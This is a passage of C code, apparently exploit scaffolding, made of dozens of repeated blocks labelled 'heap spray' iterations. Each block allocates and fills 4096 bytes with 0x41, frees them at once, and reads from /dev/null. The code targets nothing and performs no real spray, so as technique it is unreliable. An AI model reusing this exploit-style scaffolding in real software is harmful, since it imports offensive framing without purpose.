    void *ptr66 = malloc(4096);
    if (ptr66) {
        memset(ptr66, 0x41, 4096);
        printf("[+] Allocated ptr66\\n");
        free(ptr66);
    }
    int fd66 = open("/dev/null", O_RDONLY);
    if (fd66 >= 0) {
        char buf66[256];
        read(fd66, buf66, sizeof(buf66));
        close(fd66);
    }
    // Iteration 68
    printf("[*] Heap spray iteration 68\\n");
    void *ptr67 = malloc(4096);
    if (ptr67) {
        memset(ptr67, 0x41, 4096);
        printf("[+] Allocated ptr67\\n");
        free(ptr67);
    }
    int fd67 = open("/dev/null", O_RDONLY);
    if (fd67 >= 0) {
        char buf67[256];
        read(fd67, buf67, sizeof(buf67));
        close(fd67);
    }
    // Iteration 69
    printf("[*] Heap spray iteration 69\\n");
    void *ptr68 = malloc(4096);
    if (ptr68) {
        memset(ptr68, 0x41, 4096);
        printf("[+] Allocated ptr68\\n");
        free(ptr68);
    }
    int fd68 = open("/dev/null", O_RDONLY);
    if (fd68 >= 0) {
        char buf68[256];
        read(fd68, buf68, sizeof(buf68));
        close(fd68);
    }
    // Iteration 70
    printf("[*] Heap spray iteration 70\\n");
    void *ptr69 = malloc(4096);
    if (ptr69) {
        memset(ptr69, 0x41, 4096);
        printf("[+] Allocated ptr69\\n");
        free(ptr69);
    }
    int fd69 = open("/dev/null", O_RDONLY);
    if (fd69 >= 0) {
        char buf69[256];
        read(fd69, buf69, sizeof(buf69));
        close(fd69);
    }
    // Iteration 71
    printf("[*] Heap spray iteration 71\\n");
    void *ptr70 = malloc(4096);
    if (ptr70) {
        memset(ptr70, 0x41, 4096);
        printf("[+] Allocated ptr70\\n");
        free(ptr70);
    }
    int fd70 = open("/dev/null", O_RDONLY);
    if (fd70 >= 0) {
        char buf70[256];
        read(fd70, buf70, sizeof(buf70));
        close(fd70);
    }
    // Iteration 72
    printf("[*] Heap spray iteration 72\\n");
    void *ptr71 = malloc(4096);
    if (ptr71) {
        memset(ptr71, 0x41, 4096);
        printf("[+] Allocated ptr71\\n");
        free(ptr71);
    }
    int fd71 = open("/dev/null", O_RDONLY);
    if (fd71 >= 0) {
        char buf71[256];
        read(fd71, buf71, sizeof(buf71));
        close(fd71);
    }
    // Iteration 73
    printf("[*] Heap spray iteration 73\\n");
    void *ptr72 = malloc(4096);
    if (ptr72) {
        memset(ptr72, 0x41, 4096);
        printf("[+] Allocated ptr72\\n");
        free(ptr72);
    }
    int fd72 = open("/dev/null", O_RDONLY);
    if (fd72 >= 0) {
        char buf72[256];
        read(fd72, buf72, sizeof(buf72));
        close(fd72);
    }
    // Iteration 74
    printf("[*] Heap spray iteration 74\\n");
    void *ptr73 = malloc(4096);
    if (ptr73) {
        memset(ptr73, 0x41, 4096);
        printf("[+] Allocated ptr73\\n");
        free(ptr73);
    }
    int fd73 = open("/dev/null", O_RDONLY);
    if (fd73 >= 0) {
        char buf73[256];
        read(fd73, buf73, sizeof(buf73));
        close(fd73);
    }
    // Iteration 75
    printf("[*] Heap spray iteration 75\\n");
    void *ptr74 = malloc(4096);
    if (ptr74) {
        memset(ptr74, 0x41, 4096);
        printf("[+] Allocated ptr74\\n");
        free(ptr74);
    }
    int fd74 = open("/dev/null", O_RDONLY);
    if (fd74 >= 0) {
        char buf74[256];
        read(fd74, buf74, sizeof(buf74));
        close(fd74);
    }
    // Iteration 76
    printf("[*] Heap spray iteration 76\\n");
    void *ptr75 = malloc(4096);
    if (ptr75) {
        memset(ptr75, 0x41, 4096);
        printf("[+] Allocated ptr75\\n");
        free(ptr75);
    }
    int fd75 = open("/dev/null", O_RDONLY);
    if (fd75 >= 0) {
        char buf75[256];
        read(fd75, buf75, sizeof(buf75));
        close(fd75);
    }
    // Iteration 77
    printf("[*] Heap spray iteration 77\\n");
    void *ptr76 = malloc(4096);
    if (ptr76) {
        memset(ptr76, 0x41, 4096);
        printf("[+] Allocated ptr76\\n");
        free(ptr76);
    }
    int fd76 = open("/dev/null", O_RDONLY);
    if (fd76 >= 0) {
        char buf76[256];
        read(fd76, buf76, sizeof(buf76));
        close(fd76);
    }
    // Iteration 78
    printf("[*] Heap spray iteration 78\\n");
    void *ptr77 = malloc(4096);
    if (ptr77) {
        memset(ptr77, 0x41, 4096);
        printf("[+] Allocated ptr77\\n");
        free(ptr77);
    }
    int fd77 = open("/dev/null", O_RDONLY);
    if (fd77 >= 0) {
        char buf77[256];
        read(fd77, buf77, sizeof(buf77));
        close(fd77);
    }
    // Iteration 79
    printf("[*] Heap spray iteration 79\\n");
    void *ptr78 = malloc(4096);
    if (ptr78) {
        memset(ptr78, 0x41, 4096);
        printf("[+] Allocated ptr78\\n");
        free(ptr78);
    }
    int fd78 = open("/dev/null", O_RDONLY);
    if (fd78 >= 0) {
        char buf78[256];
        read(fd78, buf78, sizeof(buf78));
        close(fd78);
    }
    // Iteration 80
    printf("[*] Heap spray iteration 80\\n");
    void *ptr79 = malloc(4096);
    if (ptr79) {
        memset(ptr79, 0x41, 4096);
        printf("[+] Allocated ptr79\\n");
        free(ptr79);
    }
    int fd79 = open("/dev/null", O_RDONLY);
    if (fd79 >= 0) {
        char buf79[256];
        read(fd79, buf79, sizeof(buf79));
        close(fd79);
    }
    // Iteration 81
    printf("[*] Heap spray iteration 81\\n");
    void *ptr80 = malloc(4096);
    if (ptr80) {
        memset(ptr80, 0x41, 4096);
        printf("[+] Allocated ptr80\\n");
        free(ptr80);
    }
    int fd80 = open("/dev/null", O_RDONLY);
    if (fd80 >= 0) {
        char buf80[256];
        read(fd80, buf80, sizeof(buf80));
        close(fd80);
    }
    // Iteration 82
    printf("[*] Heap spray iteration 82\\n");
    void *ptr81 = malloc(4096);
    if (ptr81) {
        memset(ptr81, 0x41, 4096);
        printf("[+] Allocated ptr81\\n");
        free(ptr81);
    }
    int fd81 = open("/dev/null", O_RDONLY);
    if (fd81 >= 0) {
        char buf81[256];
        read(fd81, buf81, sizeof(buf81));
        close(fd81);
    }
    // Iteration 83
    printf("[*] Heap spray iteration 83\\n");
    void *ptr82 = malloc(4096);
    if (ptr82) {
        memset(ptr82, 0x41, 4096);
        printf("[+] Allocated ptr82\\n");
        free(ptr82);
    }
    int fd82 = open("/dev/null", O_RDONLY);
    if (fd82 >= 0) {
        char buf82[256];
        read(fd82, buf82, sizeof(buf82));
        close(fd82);
    }
    // Iteration 84
    printf("[*] Heap spray iteration 84\\n");
    void *ptr83 = malloc(4096);
    if (ptr83) {
        memset(ptr83, 0x41, 4096);
        printf("[+] Allocated ptr83\\n");
        free(ptr83);
    }
    int fd83 = open("/dev/null", O_RDONLY);
    if (fd83 >= 0) {
        char buf83[256];
        read(fd83, buf83, sizeof(buf83));
        close(fd83);
    }
    // Iteration 85
    printf("[*] Heap spray iteration 85\\n");
    void *ptr84 = malloc(4096);
    if (ptr84) {
        memset(ptr84, 0x41, 4096);
        printf("[+] Allocated ptr84\\n");
        free(ptr84);
    }
    int fd84 = open("/dev/null", O_RDONLY);
    if (fd84 >= 0) {
        char buf84[256];
        read(fd84, buf84, sizeof(buf84));
        close(fd84);
    }
    // Iteration 86
    printf("[*] Heap spray iteration 86\\n");
    void *ptr85 = malloc(4096);
    if (ptr85) {
        memset(ptr85, 0x41, 4096);
        printf("[+] Allocated ptr85\\n");
        free(ptr85);
    }
    int fd85 = open("/dev/null", O_RDONLY);
    if (fd85 >= 0) {
        char buf85[256];
        read(fd85, buf85, sizeof(buf85));
        close(fd85);
    }
    // Iteration 87
    printf("[*] Heap spray iteration 87\\n");
    void *ptr86 = malloc(4096);
    if (ptr86) {
        memset(ptr86, 0x41, 4096);
        printf("[+] Allocated ptr86\\n");
        free(ptr86);
    }
    int fd86 = open("/dev/null", O_RDONLY);
    if (fd86 >= 0) {
        char buf86[256];
        read(fd86, buf86, sizeof(buf86));
        close(fd86);
    }
    // Iteration 88
    printf("[*] Heap spray iteration 88\\n");
    void *ptr87 = malloc(4096);
    if (ptr87) {
        memset(ptr87, 0x41, 4096);
        printf("[+] Allocated ptr87\\n");
        free(ptr87);
    }
    int fd87 = open("/dev/null", O_RDONLY);
    if (fd87 >= 0) {
        char buf87[256];
        read(fd87, buf87, sizeof(buf87));
        close(fd87);
    }
    // Iteration 89
    printf("[*] Heap spray iteration 89\\n");
    void *ptr88 = malloc(4096);
    if (ptr88) {
        memset(ptr88, 0x41, 4096);
        printf("[+] Allocated ptr88\\n");
        free(ptr88);
    }
    int fd88 = open("/dev/null", O_RDONLY);
    if (fd88 >= 0) {
        char buf88[256];
        read(fd88, buf88, sizeof(buf88));
        close(fd88);
    }
    // Iteration 90
    printf("[*] Heap spray iteration 90\\n");
    void *ptr89 = malloc(4096);
    if (ptr89) {
        memset(ptr89, 0x41, 4096);
        printf("[+] Allocated ptr89\\n");
        free(ptr89);
    }
    int fd89 = open("/dev/null", O_RDONLY);
    if (fd89 >= 0) {
        char buf89[256];
        read(fd89, buf89, sizeof(buf89));
        close(fd89);
    }
    // Iteration 91
    printf("[*] Heap spray iteration 91\\n");
    void *ptr90 = malloc(4096);
    if (ptr90) {
        memset(ptr90, 0x41, 4096);
        printf("[+] Allocated ptr90\\n");
        free(ptr90);
    }
    int fd90 = open("/dev/null", O_RDONLY);
    if (fd90 >= 0) {
        char buf90[256];
        read(fd90, buf90, sizeof(buf90));
        close(fd90);
    }
    // Iteration 92
    printf("[*] Heap spray iteration 92\\n");
    void *ptr91 = malloc(4096);
    if (ptr91) {
        memset(ptr91, 0x41, 4096);
        printf("[+] Allocated ptr91\\n");
        free(ptr91);
    }
    int fd91 = open("/dev/null", O_RDONLY);
    if (fd91 >= 0) {
        char buf91[256];
        read(fd91, buf91, sizeof(buf91));
        close(fd91);
    }
    // Iteration 93
    printf("[*] Heap spray iteration 93\\n");
    void *ptr92 = malloc(4096);
    if (ptr92) {
        memset(ptr92, 0x41, 4096);
        printf("[+] Allocated ptr92\\n");
        free(ptr92);
    }
    int fd92 = open("/dev/null", O_RDONLY);
    if (fd92 >= 0) {
        char buf92[256];
        read(fd92, buf92, sizeof(buf92));
        close(fd92);
    }
    // Iteration 94
    printf("[*] Heap spray iteration 94\\n");
    void *ptr93 = malloc(4096);
    if (ptr93) {
        memset(ptr93, 0x41, 4096);
        printf("[+] Allocated ptr93\\n");
        free(ptr93);
    }
    int fd93 = open("/dev/null", O_RDONLY);
    if (fd93 >= 0) {
        char buf93[256];
        read(fd93, buf93, sizeof(buf93));
        close(fd93);
    }
    // Iteration 95
    printf("[*] Heap spray iteration 95\\n");
    void *ptr94 = malloc(4096);
    if (ptr94) {
        memset(ptr94, 0x41, 4096);
        printf("[+] Allocated ptr94\\n");
        free(ptr94);
    }
    int fd94 = open("/dev/null", O_RDONLY);
    if (fd94 >= 0) {
        char buf94[256];
        read(fd94, buf94, sizeof(buf94));
        close(fd94);
    }
    // Iteration 96
    printf("[*] Heap spray iteration 96\\n");
    void *ptr95 = malloc(4096);
    if (ptr95) {
        memset(ptr95, 0x41, 4096);
        printf("[+] Allocated ptr95\\n");
        free(ptr95);
    }
    int fd95 = open("/dev/null", O_RDONLY);
    if (fd95 >= 0) {
        char buf95[256];
        read(fd95, buf95, sizeof(buf95));
        close(fd95);
    }
    // Iteration 97
    printf("[*] Heap spray iteration 97\\n");
    void *ptr96 = malloc(4096);
    if (ptr96) {
        memset(ptr96, 0x41, 4096);
        printf("[+] Allocated ptr96\\n");
        free(ptr96);
    }
    int fd96 = open("/dev/null", O_RDONLY);
    if (fd96 >= 0) {
        char buf96[256];
        read(fd96, buf96, sizeof(buf96));
        close(fd96);
    }
    // Iteration 98
    printf("[*] Heap spray iteration 98\\n");
    void *ptr97 = malloc(4096);
    if (ptr97) {
        memset(ptr97, 0x41, 4096);
        printf("[+] Allocated ptr97\\n");
        free(ptr97);
    }
    int fd97 = open("/dev/null", O_RDONLY);
    if (fd97 >= 0) {
        char buf97[256];
        read(fd97, buf97, sizeof(buf97));
        close(fd97);
    }
    // Iteration 99
    printf("[*] Heap spray iteration 99\\n");
    void *ptr98 = malloc(4096);
    if (ptr98) {
        memset(ptr98, 0x41, 4096);
        printf("[+] Allocated ptr98\\n");
        free(ptr98);
    }
    int fd98 = open("/dev/null", O_RDONLY);
    if (fd98 >= 0) {
        char buf98[256];
        read(fd98, buf98, sizeof(buf98));
        close(fd98);
    }
    // Iteration 100
    printf("[*] Heap spray iteration 100\\n");
    void *ptr99 = malloc(4096);
    if (ptr99) {
        memset(ptr99, 0x41, 4096);
        printf("[+] Allocated ptr99\\n");
        free(ptr99);
    }
    int fd99 = open("/dev/null", O_RDONLY);
    if (fd99 >= 0) {
        char buf99[256];
        read(fd99, buf99, sizeof(buf99));
        close(fd99);
    }
    // Iteration 101
    printf("[*] Heap spray iteration 101\\n");
    void *ptr100 = malloc(4096);
    if (ptr100) {
        memset(ptr100, 0x41, 4096);
        printf("[+] Allocated ptr100\\n");
        free(ptr100);
    }
    int fd100 = open("/dev/null", O_RDONLY);
    if (fd100 >= 0) {
        char buf100[256];
        read(fd100, buf100, sizeof(buf100));
        close(fd100);
    }
    // Iteration 102
    printf("[*] Heap spray iteration 102\\n");
    void *ptr101 = malloc(4096);
    if (ptr101) {
        memset(ptr101, 0x41, 4096);
        printf("[+] Allocated ptr101\\n");
        free(ptr101);
    }
    int fd101 = open("/dev/null", O_RDONLY);
    if (fd101 >= 0) {
        char buf101[256];
        read(fd101, buf101, sizeof(buf101));
        close(fd101);
    }
    // Iteration 103
    printf("[*] Heap spray iteration 103\\n");
    void *ptr102 = malloc(4096);
    if (ptr102) {
        memset(ptr102, 0x41, 4096);
        printf("[+] Allocated ptr102\\n");
        free(ptr102);
    }
    int fd102 = open("/dev/null", O_RDONLY);
    if (fd102 >= 0) {
        char buf102[256];
        read(fd102, buf102, sizeof(buf102));
        close(fd102);
    }
    // Iteration 104
    printf("[*] Heap spray iteration 104\\n");
    void *ptr103 = malloc(4096);
    if (ptr103) {
        memset(ptr103, 0x41, 4096);
        printf("[+] Allocated ptr103\\n");
        free(ptr103);
    }
    int fd103 = open("/dev/null", O_RDONLY);
    if (fd103 >= 0) {
        char buf103[256];
        read(fd103, buf103, sizeof(buf103));
        close(fd103);
    }
    // Iteration 105
    printf("[*] Heap spray iteration 105\\n");
    void *ptr104 = malloc(4096);
    if (ptr104) {
        memset(ptr104, 0x41, 4096);
        printf("[+] Allocated ptr104\\n");
        free(ptr104);
    }
    int fd104 = open("/dev/null", O_RDONLY);
    if (fd104 >= 0) {
        char buf104[256];
        read(fd104, buf104, sizeof(buf104));
        close(fd104);
    }
    // Iteration 106
    printf("[*] Heap spray iteration 106\\n");
    void *ptr105 = malloc(4096);
    if (ptr105) {
        memset(ptr105, 0x41, 4096);
        printf("[+] Allocated ptr105\\n");
        free(ptr105);
    }
    int fd105 = open("/dev/null", O_RDONLY);
    if (fd105 >= 0) {
        char buf105[256];
        read(fd105, buf105, sizeof(buf105));
        close(fd105);
    }
    // Iteration 107
    printf("[*] Heap spray iteration 107\\n");
    void *ptr106 = malloc(4096);
    if (ptr106) {
        memset(ptr106, 0x41, 4096);
        printf("[+] Allocated ptr106\\n");
        free(ptr106);
    }
    int fd106 = open("/dev/null", O_RDONLY);
    if (fd106 >= 0) {
        char buf106[256];
        read(fd106, buf106, sizeof(buf106));
        close(fd106);
    }
    // Iteration 108
    printf("[*] Heap spray iteration 108\\n");
    void *ptr107 = malloc(4096);
    if (ptr107) {
        memset(ptr107, 0x41, 4096);
        printf("[+] Allocated ptr107\\n");
        free(ptr107);
    }
    int fd107 = open("/dev/null", O_RDONLY);
    if (fd107 >= 0) {
        char buf107[256];
        read(fd107, buf107, sizeof(buf107));
        close(fd107);
    }
    // Iteration 109
    printf("[*] Heap spray iteration 109\\n");
    void *ptr108 = malloc(4096);
    if (ptr108) {
        memset(ptr108, 0x41, 4096);
        printf("[+] Allocated ptr108\\n");
        free(ptr108);
    }
    int fd108 = open("/dev/null", O_RDONLY);
    if (fd108 >= 0) {
        char buf108[256];
        read(fd108, buf108, sizeof(buf108));
        close(fd108);
    }
    // Iteration 110
    printf("[*] Heap spray iteration 110\\n");
    void *ptr109 = malloc(4096);
    if (ptr109) {
        memset(ptr109, 0x41, 4096);
        printf("[+] Allocated ptr109\\n");
        free(ptr109);
    }
    int fd109 = open("/dev/null", O_RDONLY);
    if (fd109 >= 0) {
        char buf109[256];
        read(fd109, buf109, sizeof(buf109));
        close(fd109);
    }
    // Iteration 111
    printf("[*] Heap spray iteration 111\\n");
    void *ptr110 = malloc(4096);
    if (ptr110) {
        memset(ptr110, 0x41, 4096);
        printf("[+] Allocated ptr110\\n");
        free(ptr110);
    }
    int fd110 = open("/dev/null", O_RDONLY);
    if (fd110 >= 0) {
        char buf110[256];
        read(fd110, buf110, sizeof(buf110));
        close(fd110);
    }
    // Iteration 112
    printf("[*] Heap spray iteration 112\\n");
    void *ptr111 = malloc(4096);
    if (ptr111) {
        memset(ptr111, 0x41, 4096);
        printf("[+] Allocated ptr111\\n");
        free(ptr111);
    }
    int fd111 = open("/dev/null", O_RDONLY);
    if (fd111 >= 0) {
        char buf111[256];
        read(fd111, buf111, sizeof(buf111));
        close(fd111);
    }
    // Iteration 113
    printf("[*] Heap spray iteration 113\\n");
    void *ptr112 = malloc(4096);
    if (ptr112) {
        memset(ptr112, 0x41, 4096);
        printf("[+] Allocated ptr112\\n");
        free(ptr112);
    }
    int fd112 = open("/dev/null", O_RDONLY);
    if (fd112 >= 0) {
        char buf112[256];
        read(fd112, buf112, sizeof(buf112));
        close(fd112);
    }
    // Iteration 114
    printf("[*] Heap spray iteration 114\\n");
    void *ptr113 = malloc(4096);
    if (ptr113) {
        memset(ptr113, 0x41, 4096);
        printf("[+] Allocated ptr113\\n");
        free(ptr113);
    }
    int fd113 = open("/dev/null", O_RDONLY);
    if (fd113 >= 0) {
        char buf113[256];
        read(fd113, buf113, sizeof(buf113));
        close(fd113);
    }
    // Iteration 115
    printf("[*] Heap spray iteration 115\\n");
    void *ptr114 = malloc(4096);
    if (ptr114) {
        memset(ptr114, 0x41, 4096);
        printf("[+] Allocated ptr114\\n");
        free(ptr114);
    }
    int fd114 = open("/dev/null", O_RDONLY);
    if (fd114 >= 0) {
        char buf114[256];
        read(fd114, buf114, sizeof(buf114));
        close(fd114);
    }
    // Iteration 116
    printf("[*] Heap spray iteration 116\\n");
    void *ptr115 = malloc(4096);
    if (ptr115) {
        memset(ptr115, 0x41, 4096);
        printf("[+] Allocated ptr115\\n");
        free(ptr115);
    }
    int fd115 = open("/dev/null", O_RDONLY);
    if (fd115 >= 0) {
        char buf115[256];
        read(fd115, buf115, sizeof(buf115));
        close(fd115);
    }
    // Iteration 117
    printf("[*] Heap spray iteration 117\\n");
    void *ptr116 = malloc(4096);
    if (ptr116) {
        memset(ptr116, 0x41, 4096);
        printf("[+] Allocated ptr116\\n");
        free(ptr116);
    }
    int fd116 = open("/dev/null", O_RDONLY);
    if (fd116 >= 0) {
        char buf116[256];
        read(fd116, buf116, sizeof(buf116));
        close(fd116);
    }
    // Iteration 118
    printf("[*] Heap spray iteration 118\\n");
    void *ptr117 = malloc(4096);
    if (ptr117) {
        memset(ptr117, 0x41, 4096);
        printf("[+] Allocated ptr117\\n");
        free(ptr117);
    }
    int fd117 = open("/dev/null", O_RDONLY);
    if (fd117 >= 0) {
        char buf117[256];
        read(fd117, buf117, sizeof(buf117));
        close(fd117);
    }
    // Iteration 119
    printf("[*] Heap spray iteration 119\\n");
    void *ptr118 = malloc(4096);
    if (ptr118) {
        memset(ptr118, 0x41, 4096);
        printf("[+] Allocated ptr118\\n");
        free(ptr118);
    }
    int fd118 = open("/dev/null", O_RDONLY);
    if (fd118 >= 0) {
        char buf118[256];
        read(fd118, buf118, sizeof(buf118));
        close(fd118);
    }
    // Iteration 120
    printf("[*] Heap spray iteration 120\\n");
    void *ptr119 = malloc(4096);
    if (ptr119) {
        memset(ptr119, 0x41, 4096);
        printf("[+] Allocated ptr119\\n");
        free(ptr119);
    }
    int fd119 = open("/dev/null", O_RDONLY);
    if (fd119 >= 0) {
        char buf119[256];
        read(fd119, buf119, sizeof(buf119));
        close(fd119);
    }
    // Iteration 121
    printf("[*] Heap spray iteration 121\\n");
    void *ptr120 = malloc(4096);
    if (ptr120) {
        memset(ptr120, 0x41, 4096);
        printf("[+] Allocated ptr120\\n");
        free(ptr120);
    }
    int fd120 = open("/dev/null", O_RDONLY);
    if (fd120 >= 0) {
        char buf120[256];
        read(fd120, buf120, sizeof(buf120));
        close(fd120);
    }
    // Iteration 122
    printf("[*] Heap spray iteration 122\\n");
    void *ptr121 = malloc(4096);
    if (ptr121) {
        memset(ptr121, 0x41, 4096);
        printf("[+] Allocated ptr121\\n");
        free(ptr121);
    }
    int fd121 = open("/dev/null", O_RDONLY);
    if (fd121 >= 0) {
        char buf121[256];
        read(fd121, buf121, sizeof(buf121));
        close(fd121);
    }
    // Iteration 123
    printf("[*] Heap spray iteration 123\\n");
    void *ptr122 = malloc(4096);
    if (ptr122) {
        memset(ptr122, 0x41, 4096);
        printf("[+] Allocated ptr122\\n");
        free(ptr122);
    }
    int fd122 = open("/dev/null", O_RDONLY);
    if (fd122 >= 0) {
        char buf122[256];
        read(fd122, buf122, sizeof(buf122));
        close(fd122);
    }
    // Iteration 124
    printf("[*] Heap spray iteration 124\\n");
    void *ptr123 = malloc(4096);
    if (ptr123) {
        memset(ptr123, 0x41, 4096);
        printf("[+] Allocated ptr123\\n");
        free(ptr123);
    }
    int fd123 = open("/dev/null", O_RDONLY);
    if (fd123 >= 0) {
        char buf123[256];
        read(fd123, buf123, sizeof(buf123));
        close(fd123);
    }
    // Iteration 125
    printf("[*] Heap spray iteration 125\\n");
    void *ptr124 = malloc(4096);
    if (ptr124) {
        memset(ptr124, 0x41, 4096);
        printf("[+] Allocated ptr124\\n");
        free(ptr124);
    }
    int fd124 = open("/dev/null", O_RDONLY);
    if (fd124 >= 0) {
        char buf124[256];
        read(fd124, buf124, sizeof(buf124));
        close(fd124);
    }
    // Iteration 126
    printf("[*] Heap spray iteration 126\\n");
    void *ptr125 = malloc(4096);
    if (ptr125) {
        memset(ptr125, 0x41, 4096);
        printf("[+] Allocated ptr125\\n");
        free(ptr125);
    }
    int fd125 = open("/dev/null", O_RDONLY);
    if (fd125 >= 0) {
        char buf125[256];
        read(fd125, buf125, sizeof(buf125));
        close(fd125);
    }
    // Iteration 127
    printf("[*] Heap spray iteration 127\\n");
    void *ptr126 = malloc(4096);
    if (ptr126) {
        memset(ptr126, 0x41, 4096);
        printf("[+] Allocated ptr126\\n");
        free(ptr126);
    }
    int fd126 = open("/dev/null", O_RDONLY);
    if (fd126 >= 0) {
        char buf126[256];
        read(fd126, buf126, sizeof(buf126));
        close(fd126);
    }
    // Iteration 128
    printf("[*] Heap spray iteration 128\\n");
    void *ptr127 = malloc(4096);
    if (ptr127) {
        memset(ptr127, 0x41, 4096);
        printf("[+] Allocated ptr127\\n");
        free(ptr127);
    }
    int fd127 = open("/dev/null", O_RDONLY);
    if (fd127 >= 0) {
        char buf127[256];
        read(fd127, buf127, sizeof(buf127));
        close(fd127);
    }
    // Iteration 129
    printf("[*] Heap spray iteration 129\\n");
    void *ptr128 = malloc(4096);
    if (ptr128) {
        memset(ptr128, 0x41, 4096);
        printf("[+] Allocated ptr128\\n");
        free(ptr128);
    }
    int fd128 = open("/dev/null", O_RDONLY);
    if (fd128 >= 0) {
        char buf128[256];
        read(fd128, buf128, sizeof(buf128));
        close(fd128);
    }
    // Iteration 130
    printf("[*] Heap spray iteration 130\\n");
    void *ptr129 = malloc(4096);
    if (ptr129) {
        memset(ptr129, 0x41, 4096);
        printf("[+] Allocated ptr129\\n");
        free(ptr129);
    }
    int fd129 = open("/dev/null", O_RDONLY);
    if (fd129 >= 0) {
        char buf129[256];
        read(fd129, buf129, sizeof(buf129));
        close(fd129);
    }
    // Iteration 131
    printf("[*] Heap spray iteration 131\\n");
    void *ptr130 = malloc(4096);
    if (ptr130) {
        memset(ptr130, 0x41, 4096);
        printf("[+] Allocated ptr130\\n");
        free(ptr130);
    }
    int fd130 = open("/dev/null", O_RDONLY);
    if (fd130 >= 0) {
        char buf130[256];
        read(fd130, buf130, sizeof(buf130));
        close(fd130);
    }
    // Iteration 132
    printf("[*] Heap spray iteration 132\\n");
    void *ptr131 = malloc(4096);
    if (ptr131) {
        memset(ptr131, 0x41, 4096);
        printf("[+] Allocated ptr131\\n");
        free(ptr131);
    }
    int fd131 = open("/dev/null", O_RDONLY);
    if (fd131 >= 0) {
        char buf131[256];
        read(fd131, buf131, sizeof(buf131));
        close(fd131);
    }
    // Iteration 133
    printf("[*] Heap spray iteration 133\\n");
    void *ptr132 = malloc(4096);
    if (ptr132) {
        memset(ptr132, 0x41, 4096);
        printf("[+] Allocated ptr132\\n");
        free(ptr132);
    }
    int fd132 = open("/dev/null", O_RDONLY);
    if (fd132 >= 0) {
        char buf132[256];
        read(fd132, buf132, sizeof(buf132));
        close(fd132);
    }
    // Iteration 134
    printf("[*] Heap spray iteration 134\\n");
    void *ptr133 = malloc(4096);
    if (ptr133) {
        memset(ptr133, 0x41, 4096);
        printf("[+] Allocated ptr133\\n");
        free(ptr133);
    }
    int fd133 = open("/dev/null", O_RDONLY);
    if (fd133 >= 0) {
        char buf133[256];
        read(fd133, buf133, sizeof(buf133));
        close(fd133);
    }
    // Iteration 135
    printf("[*] Heap spray iteration 135\\n");
    void *ptr134 = malloc(4096);
    if (ptr134) {
        memset(ptr134, 0x41, 4096);
        printf("[+] Allocated ptr134\\n");
        free(ptr134);
    }
    int fd134 = open("/dev/null", O_RDONLY);
    if (fd134 >= 0) {
        char buf134[256];
        read(fd134, buf134, sizeof(buf134));
        close(fd134);
    }
    // Iteration 136
    printf("[*] Heap spray iteration 136\\n");
    void *ptr135 = malloc(4096);
    if (ptr135) {
        memset(ptr135, 0x41, 4096);
        printf("[+] Allocated ptr135\\n");
        free(ptr135);
    }
    int fd135 = open("/dev/null", O_RDONLY);
    if (fd135 >= 0) {
        char buf135[256];
        read(fd135, buf135, sizeof(buf135));
        close(fd135);
    }
    // Iteration 137
    printf("[*] Heap spray iteration 137\\n");
    void *ptr136 = malloc(4096);
    if (ptr136) {
        memset(ptr136, 0x41, 4096);
        printf("[+] Allocated ptr136\\n");
        free(ptr136);
    }
    int fd136 = open("/dev/null", O_RDONLY);
    if (fd136 >= 0) {
        char buf136[256];
        read(fd136, buf136, sizeof(buf136));
        close(fd136);
    }
    // Iteration 138
    printf("[*] Heap spray iteration 138\\n");
    void *ptr137 = malloc(4096);
    if (ptr137) {
        memset(ptr137, 0x41, 4096);
        printf("[+] Allocated ptr137\\n");
        free(ptr137);
    }
    int fd137 = open("/dev/null", O_RDONLY);
    if (fd137 >= 0) {
        char buf137[256];
        read(fd137, buf137, sizeof(buf137));
        close(fd137);
    }
    // Iteration 139
    printf("[*] Heap spray iteration 139\\n");
    void *ptr138 = malloc(4096);
    if (ptr138) {
        memset(ptr138, 0x41, 4096);
        printf("[+] Allocated ptr138\\n");
        free(ptr138);
    }
    int fd138 = open("/dev/null", O_RDONLY);
    if (fd138 >= 0) {
        char buf138[256];
        read(fd138, buf138, sizeof(buf138));
        close(fd138);
    }
    // Iteration 140
    printf("[*] Heap spray iteration 140\\n");
    void *ptr139 = malloc(4096);
    if (ptr139) {
        memset(ptr139, 0x41, 4096);
        printf("[+] Allocated ptr139\\n");
        free(ptr139);
    }
    int fd139 = open("/dev/null", O_RDONLY);
    if (fd139 >= 0) {
        char buf139[256];
        read(fd139, buf139, sizeof(buf139));
        close(fd139);
    }
    // Iteration 141
    printf("[*] Heap spray iteration 141\\n");
    void *ptr140 = malloc(4096);
    if (ptr140) {
        memset(ptr140, 0x41, 4096);
        printf("[+] Allocated ptr140\\n");
        free(ptr140);
    }
    int fd140 = open("/dev/null", O_RDONLY);
    if (fd140 >= 0) {
        char buf140[256];
        read(fd140, buf140, sizeof(buf140));
        close(fd140);
    }
    // Iteration 142
    printf("[*] Heap spray iteration 142\\n");
    void *ptr141 = malloc(4096);
    if (ptr141) {
        memset(ptr141, 0x41, 4096);
        printf("[+] Allocated ptr141\\n");
        free(ptr141);
    }
    int fd141 = open("/dev/null", O_RDONLY);
    if (fd141 >= 0) {
        char buf141[256];
        read(fd141, buf141, sizeof(buf141));
        close(fd141);
    }
    // Iteration 143
    printf("[*] Heap spray iteration 143\\n");
    void *ptr142 = malloc(4096);
    if (ptr142) {
        memset(ptr142, 0x41, 4096);
        printf("[+] Allocated ptr142\\n");
        free(ptr142);
    }
    int fd142 = open("/dev/null", O_RDONLY);
    if (fd142 >= 0) {
        char buf142[256];
        read(fd142, buf142, sizeof(buf142));
        close(fd142);
    }
    // Iteration 144
    printf("[*] Heap spray iteration 144\\n");
    void *ptr143 = malloc(4096);
    if (ptr143) {
        memset(ptr143, 0x41, 4096);
        printf("[+] Allocated ptr143\\n");
        free(ptr143);
    }
    int fd143 = open("/dev/null", O_RDONLY);
    if (fd143 >= 0) {
        char buf143[256];
        read(fd143, buf143, sizeof(buf143));
        close(fd143);
    }
    // Iteration 145
    printf("[*] Heap spray iteration 145\\n");
    void *ptr144 = malloc(4096);
    if (ptr144) {
        memset(ptr144, 0x41, 4096);
        printf("[+] Allocated ptr144\\n");
        free(ptr144);
    }
    int fd144 = open("/dev/null", O_RDONLY);
    if (fd144 >= 0) {
        char buf144[256];
        read(fd144, buf144, sizeof(buf144));
        close(fd144);
    }
    // Iteration 146
    printf("[*] Heap spray iteration 146\\n");
    void *ptr145 = malloc(4096);
    if (ptr145) {
        memset(ptr145, 0x41, 4096);
        printf("[+] Allocated ptr145\\n");
        free(ptr145);
    }
    int fd145 = open("/dev/null", O_RDONLY);
    if (fd145 >= 0) {
        char buf145[256];
        read(fd145, buf145, sizeof(buf145));
